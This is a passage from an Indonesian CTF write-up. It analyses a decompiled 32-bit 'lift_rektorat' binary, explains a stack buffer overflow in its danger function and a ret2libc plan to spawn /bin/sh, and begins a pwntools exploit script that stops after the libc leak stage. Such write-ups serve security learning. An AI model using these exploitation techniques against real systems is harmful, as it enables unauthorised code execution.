  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||-------------||------------||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5u&lt;/span&gt;);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;envp)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// ST08_4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// ST0C_4
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp-4h] [ebp-28h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+0h] [ebp-24h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+7h] [ebp-1Dh]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+8h] [ebp-1Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v10; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+14h] [ebp-10h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;argc;
  setvbuf(stdout, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  cetak(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;__isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v7, v3, v4, v6, v7) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; )
  {
    strcpy(aSelamatDatangD, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                          Mohon Maaf                                 |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    strcpy(aSilahkanMasuka, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                 Lantai yang Anda Masukan Salah                      |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    cetak(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--------------------||-------------||------------||------------------|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||-------------||------------||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getchar();
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v8 &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; v8 &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; );
  strcpy(aSelamatDatangD, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                     Bogor Agricultural University                   |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  strcpy(aSilahkanMasuka, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                     Searching and Serving The Best                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;i )
  {
    sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2u&lt;/span&gt;);
    byte_804B0C4[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;;
    byte_804B0C4[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;;
    byte_804B0C4[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;;
    byte_804B0C4[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;;
    cetak(i);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--------------------||-------------||------------||------------------|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||             ||            ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||-------------||------------||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; )
    {
      danger();
      strcpy(aSelamatDatangD, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                     Bogor Agricultural University                   |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
      strcpy(aSilahkanMasuka, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                     Searching and Serving The Best                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    }
  }
  cetak(i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|--------------------||                           ||------------------|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|                    ||                           ||                  |&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|____________________||                           ||__________________|&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Terlihat kalau dalau dari source code, fungsi &lt;code&gt;danger&lt;/code&gt; ada bug klasik stack buffer overflow pada fungsi fgets, yang me-overflow- &lt;code&gt;char s&lt;/code&gt;. &lt;code&gt;danger&lt;/code&gt; sendiri dipanggil saat iterasi i ke-7, user juga dapat mengontrol sampai berapa iterasi dilaksanakan. Lanjut ke permasalahan kedua, saved EIP bisa dikontrol dengan stack buffer overflow, tapi mau return kemana? return2libc perlu leaked libc address. Nah, teringat kalau binary ini adalah 32-bit jadi gaperlu repot-repot setup ROP yang terlihat magis, tinggal push GOT puts ke stack, trus print dengan menggunakan PLT puts &lt;em&gt;lagi&lt;/em&gt;. Agar exploit berlanjut terus jangan lupa untuk return ke fungsi &lt;code&gt;danger&lt;/code&gt; lagi untuk lanjut ke Stage ke-2 yakni return ke system dan exec /bin/sh. system address bisa dikalkulasi dengan bantuan libcdb. Dengan demikian strategi yang bisa ditulis pada code,&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Leak libc address, dengan push alamat suatu GOT lalu memanggil puts dan kembali ke danger&lt;/li&gt;
&lt;li&gt;Kalkulasi system dan /bin/sh dari libc address&lt;/li&gt;
&lt;li&gt;Input buffer == junk[78] + system + char junk[4] +  binsh&lt;/li&gt;
&lt;li&gt;profit&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Berikut codenya,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python2&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./lift_rektorat&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])
lift &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;./lift_rektorat&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;--------- STAGE 1 ---------&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

buf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#junk&lt;/span&gt;
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(lift&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# call puts&lt;/span&gt;
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(lift&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;danger&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# return back to danger&lt;/span&gt;
buf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(lift&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;puts&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#75715e&#34;&gt;# GOT&lt;/span&gt;

r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# control the iteration&lt;/span&gt;
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(buf)
r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Pesan Terkirim&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
